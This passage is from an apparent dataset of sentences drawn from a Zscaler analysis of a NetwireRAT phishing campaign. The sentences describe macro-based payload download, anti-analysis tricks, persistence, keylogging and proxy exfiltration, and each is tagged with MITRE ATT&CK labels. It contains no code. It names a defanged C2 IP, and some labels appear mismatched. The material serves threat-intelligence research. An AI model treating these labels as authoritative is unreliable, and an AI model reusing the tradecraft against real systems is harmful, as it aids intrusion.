different industry verticals.", "labels": ["T1566"], "document": "zscaler_2021-07-14_targeted-attack-government-organizations-delivers"}, {"sentence": "![Recipients email id from Message Source](/cdn-cgi/image/format=auto/sites/default/files/images/blogs/NetwireRAT/users%20recieved%20email.PNG)", "labels": ["S0198"], "document": "zscaler_2021-07-14_targeted-attack-government-organizations-delivers"}, {"sentence": "We have observed multiple documents being delivered in various spearphishing attacks.", "labels": ["T1566"], "document": "zscaler_2021-07-14_targeted-attack-government-organizations-delivers"}, {"sentence": "All the documents have exactly the same macro content with the same URL to download the final payload.", "labels": ["T1059"], "document": "zscaler_2021-07-14_targeted-attack-government-organizations-delivers"}, {"sentence": "1.The first document we analyzed has a macro code containing a PowerShell script to download the final payload and execute it.", "labels": ["T1059", "T1059"], "document": "zscaler_2021-07-14_targeted-attack-government-organizations-delivers"}, {"sentence": "![Attached Docm file prompts to enable Macro.](/cdn-cgi/image/format=auto/sites/default/files/images/blogs/NetwireRAT/1st%20Docm%20file%20asking%20to%20enable%20macro.PNG)", "labels": ["S0198", "T1204"], "document": "zscaler_2021-07-14_targeted-attack-government-organizations-delivers"}, {"sentence": "*Figure 5: Attached .Docm file prompts the user to enable macros*", "labels": ["T1204"], "document": "zscaler_2021-07-14_targeted-attack-government-organizations-delivers"}, {"sentence": "2.The second document we analyzed has a different title and slightly different text, but is otherwise extremely similar to the first document, and also has a macro code containing a PowerShell script to download the final payload and execute it.", "labels": ["T1059", "T1059"], "document": "zscaler_2021-07-14_targeted-attack-government-organizations-delivers"}, {"sentence": "![Another docm file having malicious macro](/cdn-cgi/image/format=auto/sites/default/files/images/blogs/NetwireRAT/2nd%20Docm%20file%20asking%20to%20enable%20macro.PNG)", "labels": ["S0198", "T1059"], "document": "zscaler_2021-07-14_targeted-attack-government-organizations-delivers"}, {"sentence": "*Figure 6: Another malicious .docm file*", "labels": ["T1059"], "document": "zscaler_2021-07-14_targeted-attack-government-organizations-delivers"}, {"sentence": "It contains a macro code containing a PowerShell script to download the final payload and execute it.", "labels": ["T1059", "T1059"], "document": "zscaler_2021-07-14_targeted-attack-government-organizations-delivers"}, {"sentence": "![Another similar docm having malicious macro](/cdn-cgi/image/format=auto/sites/default/files/images/blogs/NetwireRAT/3rd%20Docm%20file%20asking%20to%20enable%20macro.PNG)", "labels": ["S0198", "T1059"], "document": "zscaler_2021-07-14_targeted-attack-government-organizations-delivers"}, {"sentence": "*Figure 7: Another similar .docm with a malicious macro*", "labels": ["T1059"], "document": "zscaler_2021-07-14_targeted-attack-government-organizations-delivers"}, {"sentence": "**Technical Analysis of the macro**", "labels": ["T1059"], "document": "zscaler_2021-07-14_targeted-attack-government-organizations-delivers"}, {"sentence": "Once the document is opened, attackers try to trick the user by prompting them to enable macros to read the complete document.", "labels": ["T1204", "T1204"], "document": "zscaler_2021-07-14_targeted-attack-government-organizations-delivers"}, {"sentence": "Once the user enables the macro, an AutoOpen() subroutine is called which then executes a malicious Visual Basic Application (VBA) macro with base-64 encoded URL.", "labels": ["TA0002", "T1204", "T1059", "T1027"], "document": "zscaler_2021-07-14_targeted-attack-government-organizations-delivers"}, {"sentence": "The macro downloads the final payload and path to save and execute the payload with the help of a PowerShell command.", "labels": ["T1059", "T1059"], "document": "zscaler_2021-07-14_targeted-attack-government-organizations-delivers"}, {"sentence": "![Macro code having based 64 encoded URL](/cdn-cgi/image/format=auto/sites/default/files/images/blogs/NetwireRAT/1st%20macro%20code.PNG)", "labels": ["S0198", "T1059"], "document": "zscaler_2021-07-14_targeted-attack-government-organizations-delivers"}, {"sentence": "*Figure 8: Macro code with base 64 encoded URL*", "labels": ["T1059", "T1027"], "document": "zscaler_2021-07-14_targeted-attack-government-organizations-delivers"}, {"sentence": "The two functions performed by the macro code are:", "labels": ["T1059"], "document": "zscaler_2021-07-14_targeted-attack-government-organizations-delivers"}, {"sentence": "a.Download the payload from the given URL in the macro code.", "labels": ["T1059"], "document": "zscaler_2021-07-14_targeted-attack-government-organizations-delivers"}, {"sentence": "b.Save and execute the payload from the specified path in the macro code.", "labels": ["TA0002", "T1059"], "document": "zscaler_2021-07-14_targeted-attack-government-organizations-delivers"}, {"sentence": "![Decrypted Macro code](/cdn-cgi/image/format=auto/sites/default/files/images/blogs/NetwireRAT/1st%20decrypted%20macro.PNG)", "labels": ["S0198", "T1059"], "document": "zscaler_2021-07-14_targeted-attack-government-organizations-delivers"}, {"sentence": "*Figure 9: Decrypted Macro code*", "labels": ["T1059"], "document": "zscaler_2021-07-14_targeted-attack-government-organizations-delivers"}, {"sentence": "Once PowerShell downloads the final payload (NetwiredRC), it copies itself to the above mentioned path from where it gets executed.", "labels": ["S0198", "T1059"], "document": "zscaler_2021-07-14_targeted-attack-government-organizations-delivers"}, {"sentence": "NetwireRAT is not a new malware/RAT on the surface.", "labels": ["S0198"], "document": "zscaler_2021-07-14_targeted-attack-government-organizations-delivers"}, {"sentence": "First seen in 2012, it attempts to\u00a0steal victims' passwords, including login credentials, FTP credentials, credit card data etc.", "labels": ["TA0006"], "document": "zscaler_2021-07-14_targeted-attack-government-organizations-delivers"}, {"sentence": "NetWireRAT is believed to have been used by the Iranian Nation state sponsored group APT33/Elfin back in 2016.", "labels": ["G0064", "S0198"], "document": "zscaler_2021-07-14_targeted-attack-government-organizations-delivers"}, {"sentence": "Once executed on the victim\u2019s machine, several anti-analysis techniques are used to protect it from analysis.", "labels": ["TA0002", "T1036"], "document": "zscaler_2021-07-14_targeted-attack-government-organizations-delivers"}, {"sentence": "This version of Netwire has recently been employed with new anti-analysis techniques in order to hinder its reversal.", "labels": ["S0332", "T1036"], "document": "zscaler_2021-07-14_targeted-attack-government-organizations-delivers"}, {"sentence": "Earlier versions involved WinApi usage for anti-analysis tricks like using **GetCursorPos(), ZwGetContextThread()** to check mouse position and to check register status for breakpoints respectively.", "labels": ["T1106", "TA0005", "T1106"], "document": "zscaler_2021-07-14_targeted-attack-government-organizations-delivers"}, {"sentence": "The below screenshot shows the usage of GetCursorPos() api as anti-trick in an older version.", "labels": ["T1106"], "document": "zscaler_2021-07-14_targeted-attack-government-organizations-delivers"}, {"sentence": "![Anti-Analysis technique used in older version](/cdn-cgi/image/format=auto/sites/default/files/images/blogs/NetwireRAT/Anti-Analysis%20technique%20used%20in%20older%20version.png)", "labels": ["S0198"], "document": "zscaler_2021-07-14_targeted-attack-government-organizations-delivers"}, {"sentence": "*Figure 10: Anti-Analysis technique used in older version of NetWire*", "labels": ["TA0005"], "document": "zscaler_2021-07-14_targeted-attack-government-organizations-delivers"}, {"sentence": "In addition to this, the old NetWire malware also checked the registers status against soft breakpoints, as we can see in the above image.", "labels": ["T1497"], "document": "zscaler_2021-07-14_targeted-attack-government-organizations-delivers"}, {"sentence": "For example, the call 'eax' is the call to the API.", "labels": ["T1106"], "document": "zscaler_2021-07-14_targeted-attack-government-organizations-delivers"}, {"sentence": "If we put a breakpoint on that in the debugger, the byte is replaced with 0xCC.", "labels": ["T1562"], "document": "zscaler_2021-07-14_targeted-attack-government-organizations-delivers"}, {"sentence": "That value is checked by NetWire using ZwGetThreadContext() api as an anti-trick.", "labels": ["T1106"], "document": "zscaler_2021-07-14_targeted-attack-government-organizations-delivers"}, {"sentence": "During our analysis, we found that the malware extracts malicious code into the memory and executes it to evade antivirus detection.", "labels": ["TA0002", "T1620"], "document": "zscaler_2021-07-14_targeted-attack-government-organizations-delivers"}, {"sentence": "![Import libraries of the malware](/cdn-cgi/image/format=auto/sites/default/files/images/blogs/NetwireRAT/import.PNG)", "labels": ["S0198"], "document": "zscaler_2021-07-14_targeted-attack-government-organizations-delivers"}, {"sentence": "Debugging the malicious code, we have seen that the malware author has also employed string obfuscation as an anti-analysis trick as shown in figure:12.", "labels": ["T1027"], "document": "zscaler_2021-07-14_targeted-attack-government-organizations-delivers"}, {"sentence": "![Obfuscated String](/cdn-cgi/image/format=auto/sites/default/files/images/blogs/NetwireRAT/Obfuscated%20String.PNG)", "labels": ["S0198"], "document": "zscaler_2021-07-14_targeted-attack-government-organizations-delivers"}, {"sentence": "*Figure 12: Obfuscated String*", "labels": ["T1027"], "document": "zscaler_2021-07-14_targeted-attack-government-organizations-delivers"}, {"sentence": "Following decryption, we get the following API: \u201c***winHttpGetIEProxyConfigForCurrentUser***\u201d", "labels": ["T1106"], "document": "zscaler_2021-07-14_targeted-attack-government-organizations-delivers"}, {"sentence": "This piece of code has a self-decryption routine where it allocates a new memory space and then decrypts the code.", "labels": ["T1140"], "document": "zscaler_2021-07-14_targeted-attack-government-organizations-delivers"}, {"sentence": "![Self-Decryption Routine](/cdn-cgi/image/format=auto/sites/default/files/images/blogs/NetwireRAT/Self%20decrypting%20routine.PNG)", "labels": ["S0198", "T1140"], "document": "zscaler_2021-07-14_targeted-attack-government-organizations-delivers"}, {"sentence": "*Figure 13: Self-Decryption Routine*", "labels": ["T1140"], "document": "zscaler_2021-07-14_targeted-attack-government-organizations-delivers"}, {"sentence": "After decryption, the malware assigns HostId randomly and adds it as a registry key.", "labels": ["T1140", "T1112"], "document": "zscaler_2021-07-14_targeted-attack-government-organizations-delivers"}, {"sentence": "![Random HostID](/cdn-cgi/image/format=auto/sites/default/files/images/blogs/NetwireRAT/Host-ID.PNG)", "labels": ["S0198"], "document": "zscaler_2021-07-14_targeted-attack-government-organizations-delivers"}, {"sentence": "![Registry key for persistence](/cdn-cgi/image/format=auto/sites/default/files/images/blogs/NetwireRAT/Host%20ID%20and%20install%20date%20in%20registry.PNG)", "labels": ["TA0003", "S0198"], "document": "zscaler_2021-07-14_targeted-attack-government-organizations-delivers"}, {"sentence": "*Figure 15: Registry key for persistence.*", "labels": ["TA0003"], "document": "zscaler_2021-07-14_targeted-attack-government-organizations-delivers"}, {"sentence": "This malware basically steals sensitive information from the victim's machine.", "labels": ["TA0010"], "document": "zscaler_2021-07-14_targeted-attack-government-organizations-delivers"}, {"sentence": "![Stealing information](/cdn-cgi/image/format=auto/sites/default/files/images/blogs/NetwireRAT/Stealing%20data.PNG)", "labels": ["S0198"], "document": "zscaler_2021-07-14_targeted-attack-government-organizations-delivers"}, {"sentence": "A sample of keystrokes logs in a file that is created in the %AppData% directory, which the malware stores in obfuscated form.", "labels": ["T1036"], "document": "zscaler_2021-07-14_targeted-attack-government-organizations-delivers"}, {"sentence": "![Keylogs in obfuscated form](/cdn-cgi/image/format=auto/sites/default/files/images/blogs/NetwireRAT/log.png)", "labels": ["S0198"], "document": "zscaler_2021-07-14_targeted-attack-government-organizations-delivers"}, {"sentence": "*Figure 17: Keylogs in obfuscated form*", "labels": ["T1027"], "document": "zscaler_2021-07-14_targeted-attack-government-organizations-delivers"}, {"sentence": "**Command and Control**", "labels": ["TA0011"], "document": "zscaler_2021-07-14_targeted-attack-government-organizations-delivers"}, {"sentence": "Another thing related to network activity we observed in the new variant was that this new Netwire variant uses **WinHttpGetIEProxyConfigForCurrentUser()** api ,which retrieves the Internet Explorer proxy configuration for the current user in the system (adversaries use this feature as a network relay between the malware and the proxy server by listening over a certain port).", "labels": ["S0332", "T1106", "T1016", "T1090"], "document": "zscaler_2021-07-14_targeted-attack-government-organizations-delivers"}, {"sentence": "This api retrieves the list of proxy servers in the system.", "labels": ["T1016"], "document": "zscaler_2021-07-14_targeted-attack-government-organizations-delivers"}, {"sentence": "It steals users' sensitive information and browser history stored in the browsers and sends it to the command and control server.", "labels": ["TA0011", "T1005"], "document": "zscaler_2021-07-14_targeted-attack-government-organizations-delivers"}, {"sentence": "During our analysis of the binary structure, we found the hardcoded IP address of the Command and Control server: 66[.]42.43.177.", "labels": ["TA0011"], "document": "zscaler_2021-07-14_targeted-attack-government-organizations-delivers"}, {"sentence": "![Data to be sent using proxy](/cdn-cgi/image/format=auto/sites/default/files/images/blogs/NetwireRAT/Data%20to%20be%20sent%20using%20proxy.png)", "labels": ["S0198"], "document": "zscaler_2021-07-14_targeted-attack-government-organizations-delivers"}, {"sentence": "ThreatLabz observed that NetwireRAT malware sends the collected victim\u2019s data using the proxy server in obfuscated form using the same api (which was decrypted above).", "labels": ["S0198", "T1048"], "document": "zscaler_2021-07-14_targeted-attack-government-organizations-delivers"}, {"sentence": "This way of sending victims' data using a proxy server is a new feature being implemented in the updated version of NetWireRAT.", "labels": ["T1048", "S0198"], "document": "zscaler_2021-07-14_targeted-attack-government-organizations-delivers"}, {"sentence": "*\"C2 list\": [", "labels": ["TA0011"], "document": "zscaler_2021-07-14_targeted-attack-government-organizations-delivers"}, {"sentence": "![Zscaler Cloud Sandbox detection](/cdn-cgi/image/format=auto/sites/default/files/images/blogs/NetwireRAT/Sandbox%20report%20of%20payload.PNG)", "labels": ["S0198"], "document": "zscaler_2021-07-14_targeted-attack-government-organizations-delivers"}, {"sentence": "Over the years, cyber criminals have adopted multiple ways to infect their victims with NetwiredRC and achieved lots of success.", "labels": ["S0198"], "document": "zscaler_2021-07-14_targeted-attack-government-organizations-delivers"}, {"sentence": "We are not conclusively attributing this attack to any particular group with high confidence, but similar techniques and NetwireRAT payloads have been utilized by state sponsored groups such as APT33 and Gorgon.", "labels": ["S0198", "G0064", "G0078"], "document": "zscaler_2021-07-14_targeted-attack-government-organizations-delivers"}, {"sentence": "Attackers continuously embrace new anti-analysis tricks to evade security solutions; re-packaging of malware makes static analysis even more challenging.", "labels": ["TA0005"], "document": "zscaler_2021-07-14_targeted-attack-government-organizations-delivers"}]